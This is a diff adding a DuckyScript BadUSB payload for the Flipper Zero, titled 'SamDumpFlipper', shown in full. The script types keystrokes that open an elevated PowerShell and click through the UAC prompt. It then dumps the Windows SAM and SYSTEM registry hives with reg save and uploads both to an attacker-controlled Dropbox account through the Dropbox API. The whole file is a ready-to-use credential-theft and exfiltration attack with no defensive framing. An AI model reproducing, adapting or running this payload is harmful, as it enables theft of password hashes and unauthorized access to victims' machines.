@@ -1,0 +1,84 @@
+REM Title:         SamDumpFlipper
+REM Description:   Dump users SAM and SYSTEM hives and exfiltrate them to Dropbox using Flipper Zero.
+REM Author:        by flippermen
+REM Version:       2.0
+REM Category:      Credentials
+REM Attackmodes:   HID
+
+DELAY 1000
+
+REM Minimize all windows
+WINDOWS d
+DELAY 500
+
+REM Open Run dialog
+WINDOWS r
+DELAY 500
+
+REM Open PowerShell with elevated privileges
+STRING powershell Start-Process PowerShell -Verb runAs
+ENTER
+DELAY 2000
+
+REM Accept UAC prompt (adjust for language if needed)
+ALT LEFTARROW
+DELAY 1000
+ALT ENTER
+DELAY 2000
+
+REM Wait for elevated PowerShell window to be ready
+DELAY 1000
+
+REM Define Dropbox token and paths
+STRING $DropboxToken = 'your token'
+ENTER
+DELAY 500
+
+STRING $SamPath = 'C:\\Windows\\Temp\\sam'
+ENTER
+DELAY 500
+
+STRING $SystemPath = 'C:\\Windows\\Temp\\system'
+ENTER
+DELAY 500
+
+REM Remove existing files if they exist
+STRING Remove-Item -Path $SamPath -Force
+ENTER
+DELAY 500
+
+STRING Remove-Item -Path $SystemPath -Force
+ENTER
+DELAY 500
+
+REM Save SAM and SYSTEM hives
+STRING reg save hklm\sam $SamPath
+ENTER
+DELAY 2000
+
+STRING reg save hklm\system $SystemPath
+ENTER
+DELAY 2000
+
+REM Read the contents of the SAM and SYSTEM files
+STRING $SamContent = [System.IO.File]::ReadAllBytes($SamPath)
+ENTER
+DELAY 500
+
+STRING $SystemContent = [System.IO.File]::ReadAllBytes($SystemPath)
+ENTER
+DELAY 500
+
+REM Uploading to Dropbox using Invoke-RestMethod
+STRING Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Headers @{ 'Authorization' = "Bearer $DropboxToken"; 'Dropbox-API-Arg' = '{"path":"/sam","mode":"add","autorename":true}'; 'Content-Type' = "application/octet-stream" } -Method Post -Body $SamContent
+ENTER
+DELAY 2000
+
+STRING Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Headers @{ 'Authorization' = "Bearer $DropboxToken"; 'Dropbox-API-Arg' = '{"path":"/system","mode":"add","autorename":true}'; 'Content-Type' = "application/octet-stream" } -Method Post -Body $SystemContent
+ENTER
+DELAY 2000
+
+REM Signal the end of the script
+STRING (New-Object -ComObject wscript.shell).SendKeys('{CAPSLOCK}')
+ENTER
+DELAY 500
